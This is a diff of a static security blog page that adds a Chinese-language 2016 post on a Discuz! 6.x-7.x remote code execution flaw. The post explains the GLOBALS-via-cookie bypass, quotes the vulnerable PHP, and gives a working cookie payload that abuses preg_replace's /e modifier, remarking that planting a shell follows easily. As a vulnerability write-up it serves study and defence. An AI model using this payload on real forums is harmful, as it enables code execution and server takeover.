@@ -150,6 +150,121 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
+    <link itemprop="mainEntityOfPage" href="https://blog.securitainment.io/2016/05/14/discuz-6.x-7.x-REC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Groot">
+      <meta itemprop="description" content="运维 | 安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/discuz-6.x-7.x-REC/" class="post-title-link" itemprop="url">Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:54:00" itemprop="dateCreated datePublished" datetime="2016-05-14T00:54:00+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-06-09 10:09:08" itemprop="dateModified" datetime="2020-06-09T10:09:08+08:00">2020-06-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h2 id="Discuz-6-x-7-x-版本-前台任意代码执行漏洞"><a href="#Discuz-6-x-7-x-版本-前台任意代码执行漏洞" class="headerlink" title="Discuz! 6.x-7.x 版本 前台任意代码执行漏洞"></a>Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</h2><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。</p>
+<p>include/global.func.php代码里：</p>
+<pre><code>&lt;code id=&quot;code0&quot;&gt;function daddslashes($string, $force = 0) {
+        !defined(&apos;MAGIC_QUOTES_GPC&apos;) &amp;&amp; define(&apos;MAGIC_QUOTES_GPC&apos;, get_magic_quotes_gpc());
+        if(!MAGIC_QUOTES_GPC || $force) {
+                if(is_array($string)) {
+                        foreach($string as $key =&gt; $val) {
+                                $string[$key] = daddslashes($val, $force);
+                        }
+                } else {
+                        $string = addslashes($string);
+                }
+        }
+        return $string;
+}&lt;/code&gt;</code></pre><p>include/common.inc.php里：</p>
+<pre><code>foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) {
+        foreach($$_request as $_key =&gt; $_value) {
+                $_key{0} != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value);//变量引入000111222
+        }
+}</code></pre><p>模拟register_globals功能的代码,在GPC为off时会调用addslashes()函数处理变量值,但是如果直接使用$_GET/$_POST/$_COOKIE这样的变量,这个就不起作用了,然而dz的源码里直接使用$_GET/$_POST/$_COOKIE的地方很少,存在漏洞的地方更加少:(</p>
+<p>不过还有其他的绕过方法,在register_globals=on下通过提交GLOBALS变量就可以绕过上面的代码了.为了防止这种情况,dz中有如下代码:</p>
+<pre><code>if (isset($_REQUEST[&apos;GLOBALS&apos;]) OR isset($_FILES[&apos;GLOBALS&apos;])) {
+        exit(&apos;Request tainting attempted.&apos;);
+}</code></pre><p>这样就没法提交GLOBALS变量了么？</p>
+<p>$_REQUEST这个超全局变量的值受php.ini中request_order的影响,在最新的php5.3.x系列中,request_order默认值为GP,也就是说默认配置下$_REQUEST只包含$_GET和$_POST,而不包括$_COOKIE,那么我们就可以通过COOKIE来提交GLOBALS变量了:)</p>
+<h2 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h2><p>include/discuzcode.func.php</p>
+<pre><code>function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode = 1, $allowhtml = 0, $jammer = 0, $parsetype = &apos;0&apos;, $authorid = &apos;0&apos;, $allowmediacode = &apos;0&apos;, $pid = 0) {
+        global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;
+        if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, &apos;[ /code]&apos;) || strpos($message, &apos;[ /CODE]&apos;)) !== FALSE) {
+                $message = preg_replace(&quot;/\s?\[code\](.+?)\[\/code\]\s?/ies&quot;, &quot;codedisp(&apos;\\1&apos;)&quot;, $message);
+        }
+        $msglower = strtolower($message);
+        //$htmlon = $htmlon &amp;&amp; $allowhtml ? 1 : 0;
+        if(!$htmlon) {
+                $message = $jammer ? preg_replace(&quot;/\r\n|\n|\r/e&quot;, &quot;jammer()&quot;, dhtmlspecialchars($message)) : dhtmlspecialchars($message);
+        }
+        if(!$smileyoff &amp;&amp; $allowsmilies &amp;&amp; !empty($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;]) &amp;&amp; is_array($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;])) {
+                if(!$discuzcodes[&apos;smiliesreplaced&apos;]) {
+                        foreach($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;] AS $key =&gt; $smiley) {
+                                $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;][$key] = &apos;&lt;img src=&quot;images/smilies/&apos;.$GLOBALS[&apos;_DCACHE&apos;][&apos;smileytypes&apos;][$GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;typearray&apos;][$key]][&apos;directory&apos;].&apos;/&apos;.$smiley.&apos;&quot; smilieid=&quot;&apos;.$key.&apos;&quot; border=&quot;0&quot; alt=&quot;&quot; /&gt;&apos;;
+                        }
+                        $discuzcodes[&apos;smiliesreplaced&apos;] = 1;
+                }
+        $message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);
+        }
+        ......</code></pre><p>119行 ：</p>
+<pre><code>$message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);  //让 preg_replace 加上/e 修正符，产生代码执行</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>访问一个存在的帖子，需要访问的页面有表情。<br>例如：<a href="http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1" target="_blank" rel="noopener">http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1</a><br>然后刷新帖子，拦截数据包，cookie中添加</p>
+<pre><code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code></pre><p>如有漏洞，即可看到效果.<br>写个shell 自然也不是问题了~</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><img src="https://www.t00ls.net/attachments/month_1411/1411232121316afb1fac2c2397.jpg" alt=""></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
     <link itemprop="mainEntityOfPage" href="https://blog.securitainment.io/2016/05/14/discuz-admin_styles.inc.php-get-webshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -785,13 +900,13 @@ Discuz!NT3.5.2文件编辑0Day获取Webshell</code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
